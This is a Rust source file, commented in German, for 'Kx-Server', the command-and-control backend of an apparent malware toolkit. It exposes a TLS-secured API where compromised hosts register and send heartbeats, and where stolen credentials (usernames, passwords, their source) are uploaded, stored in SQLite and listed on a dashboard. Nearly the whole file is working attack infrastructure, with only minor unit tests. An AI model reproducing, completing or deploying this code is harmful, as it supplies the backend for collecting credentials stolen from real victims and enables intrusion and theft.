//! Kx-Server: C2-Backend mit Host-Registry, Secrets-Storage und Dashboard.
//!
//! Startet einen TLS-gesicherten axum-Server, der kompromittierte Hosts,
//! erbeutete Secrets und Tasks persistiert. Die API ist mit einem
//! Bearer-Token geschützt; das Dashboard wird unter `/` ausgeliefert.

mod auth;
mod dashboard;
mod db;

use std::net::{SocketAddr, ToSocketAddrs};
use std::path::PathBuf;
use std::sync::Arc;

use axum::{
    extract::{Json, State},
    http::StatusCode,
    response::{Html, IntoResponse},
    routing::{get, post},
    Router,
};
use axum_server::tls_rustls::RustlsConfig;
use clap::Parser;
use db::{Db, HostRow, SecretRow};
use kx_core::c2::{
    self, HeartbeatRequest, RegisterRequest, SecretUpload, PATH_HEARTBEAT, PATH_HOSTS,
    PATH_REGISTER, PATH_SECRETS, PATH_TASKS,
};
use uuid::Uuid;

/// Zeigt die API-Endpunkte an.
const HELP: &str = "POST /api/register   Host registrieren\n\
                    POST /api/heartbeat   Host-Heartbeat senden\n\
                    POST /api/secrets     Secret hochladen\n\
                    GET  /api/hosts       Alle Hosts\n\
                    GET  /api/secrets     Alle Secrets\n\
                    GET  /api/tasks       Alle Tasks";

#[derive(Parser)]
#[command(name = "kx-server", about = "Kx-C2-Backend")]
struct Cli {
    /// Bind-Adresse des Servers.
    #[arg(long, default_value = "127.0.0.1")]
    host: String,
    /// Port des Servers.
    #[arg(long, default_value_t = 8443)]
    port: u16,
    /// Pfad zur SQLite-Datenbank.
    #[arg(long, default_value = "kx.db")]
    db: PathBuf,
    /// Bearer-Token für die API (leer => zufällig erzeugen).
    #[arg(long, env = "KX_SERVER_TOKEN")]
    token: Option<String>,
    /// Common Name für das selbstsignierte Zertifikat.
    #[arg(long, default_value = "kx.local")]
    cn: String,
}

/// Server-Zustand: Datenbank und Auth-Token.
#[derive(Clone)]
struct AppState {
    db: Arc<Db>,
    token: String,
}

/// Registriert einen Host. Die Host-ID kommt aus dem Request — der Server leitet
/// sie nicht mehr aus der IP ab, sonst könnten Registrierung und Secret-Upload
/// auseinanderlaufen.
async fn register(
    State(st): State<AppState>,
    Json(req): Json<RegisterRequest>,
) -> impl IntoResponse {
    if req.host_id.is_empty() {
        return (StatusCode::BAD_REQUEST, "host_id darf nicht leer sein").into_response();
    }
    let now = kx_core::util::now_rfc3339();
    let host = HostRow {
        id: req.host_id,
        ip: req.ip,
        hostname: req.hostname.unwrap_or_default(),
        os: req.os.unwrap_or_default(),
        status: req.status.unwrap_or_else(|| c2::STATUS_DISCOVERED.into()),
        first_seen: now.clone(),
        last_seen: now,
    };
    match st.db.upsert_host(&host) {
        Ok(()) => StatusCode::CREATED.into_response(),
        Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
    }
}

/// Aktualisiert das Last-Seen eines Hosts.
async fn heartbeat(
    State(st): State<AppState>,
    Json(req): Json<HeartbeatRequest>,
) -> impl IntoResponse {
    let hosts = match st.db.list_hosts() {
        Ok(h) => h,
        Err(_) => return StatusCode::INTERNAL_SERVER_ERROR.into_response(),
    };
    if let Some(h) = hosts.into_iter().find(|h| h.id == req.host_id) {
        let mut h = h;
        h.last_seen = kx_core::util::now_rfc3339();
        if st.db.upsert_host(&h).is_ok() {
            StatusCode::OK.into_response()
        } else {
            StatusCode::INTERNAL_SERVER_ERROR.into_response()
        }
    } else {
        StatusCode::NOT_FOUND.into_response()
    }
}

/// Speichert ein hochgeladenes Secret.
async fn upload_secret(
    State(st): State<AppState>,
    Json(req): Json<SecretUpload>,
) -> impl IntoResponse {
    if req.host_id.is_empty() {
        return (StatusCode::BAD_REQUEST, "host_id darf nicht leer sein").into_response();
    }
    let secret = SecretRow {
        id: Uuid::new_v4().to_string(),
        host_id: req.host_id,
        cred_type: req.cred_type,
        username: req.username,
        password: req.password,
        source: req.source.unwrap_or_default(),
        collected_at: kx_core::util::now_rfc3339(),
    };
    match st.db.insert_secret(&secret) {
        Ok(()) => StatusCode::CREATED.into_response(),
        Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
    }
}

/// Liefert alle Hosts als JSON.
async fn list_hosts(State(st): State<AppState>) -> impl IntoResponse {
    match st.db.list_hosts() {
        Ok(rows) => {
            let hosts: Vec<c2::Host> = rows.into_iter().map(c2::Host::from).collect();
            Json(hosts).into_response()
        }
        Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
    }
}

/// Liefert alle Secrets als JSON.
async fn list_secrets(State(st): State<AppState>) -> impl IntoResponse {
    match st.db.list_secrets() {
        Ok(rows) => {
            let secrets: Vec<c2::ExfiltratedSecret> =
                rows.into_iter().map(c2::ExfiltratedSecret::from).collect();
            Json(secrets).into_response()
        }
        Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
    }
}

/// Liefert alle Tasks als JSON.
async fn list_tasks(State(st): State<AppState>) -> impl IntoResponse {
    match st.db.list_tasks() {
        Ok(rows) => {
            let tasks: Vec<c2::Task> = rows.into_iter().map(c2::Task::from).collect();
            Json(tasks).into_response()
        }
        Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
    }
}

/// Liefert das HTML-Dashboard (ohne Auth, Token via URL-Parameter).
async fn dashboard() -> impl IntoResponse {
    Html(dashboard::DASHBOARD_HTML)
}

#[tokio::main]
async fn main() {
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env()
                .unwrap_or_else(|_| "kx_server=info".into()),
        )
        .init();

    let cli = Cli::parse();

    // Token bestimmen: CLI > Env > zufällig.
    let cli_token_provided = cli.token.is_some();
    let token = cli
        .token
        .or_else(|| std::env::var("KX_SERVER_TOKEN").ok())
        .unwrap_or_else(|| Uuid::new_v4().to_string());
    if !cli_token_provided {
        eprintln!("Kx-Server: kein Token gesetzt, verwende generiertes: {token}");
    }
    // auth.rs liest das Token aus der Environment-Variable.
    std::env::set_var("KX_SERVER_TOKEN", &token);

    let db = Db::open(&cli.db).expect("Datenbank nicht erreichbar");
    let state = AppState {
        db: Arc::new(db),
        token: token.clone(),
    };

    // TLS-Material: selbstsigniert generieren.
    let tls = kx_tls::generate_server_tls(&cli.cn).expect("TLS-Zertifikat erzeugbar");
    let cert_pem = tls.cert_pem.clone();
    let key_pem = tls.key_pem;

    let app = Router::new()
        .route("/", get(dashboard))
        .route(PATH_REGISTER, post(register))
        .route(PATH_HEARTBEAT, post(heartbeat))
        .route(PATH_SECRETS, post(upload_secret))
        .route(PATH_HOSTS, get(list_hosts))
        .route(PATH_SECRETS, get(list_secrets))
        .route(PATH_TASKS, get(list_tasks))
        .with_state(state);

    let addr: SocketAddr = format!("{}:{}", cli.host, cli.port)
        .to_socket_addrs()
        .expect("Bind-Adresse auflösbar")
        .next()
        .expect("Bind-Adresse vorhanden");

    let config = RustlsConfig::from_pem(cert_pem, key_pem)
        .await
        .expect("TLS-Config");

    tracing::info!("Kx-Server lauscht auf https://{} (API: {HELP})", addr);
    axum_server::bind_rustls(addr, config)
        .serve(app.into_make_service())
        .await
        .expect("Server-Loop");
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Die Hilfetext-Auflistung nennt jeden Endpunkt, den der Router registriert.
    /// Der Hilfetext ist die sechste Fundstelle des Vertrags — er muss mitlaufen.
    #[test]
    fn help_text_lists_every_contract_path() {
        for path in [
            PATH_REGISTER,
            PATH_HEARTBEAT,
            PATH_SECRETS,
            PATH_HOSTS,
            PATH_TASKS,
        ] {
            assert!(
                HELP.contains(path),
                "der Hilfetext nennt den Endpunkt {path} nicht"
            );
        }
    }

    /// Der Router registriert genau die Endpunkte des C2-Protokolls.
    #[test]
    fn router_registers_the_contract_paths() {
        let app = Router::new()
            .route("/", get(dashboard))
            .route(PATH_REGISTER, post(register))
            .route(PATH_HEARTBEAT, post(heartbeat))
            .route(PATH_SECRETS, post(upload_secret))
            .route(PATH_HOSTS, get(list_hosts))
            .route(PATH_SECRETS, get(list_secrets))
            .route(PATH_TASKS, get(list_tasks));
        // Ohne State lässt sich der Router nicht in einen Request schicken —
        // die Route-Pfade lassen sich aber über die Debug-Ausgabe prüfen.
        let debug = format!("{app:?}");
        for path in [
            PATH_REGISTER,
            PATH_HEARTBEAT,
            PATH_SECRETS,
            PATH_HOSTS,
            PATH_TASKS,
        ] {
            assert!(debug.contains(path), "der Router registriert {path} nicht");
        }
    }
}

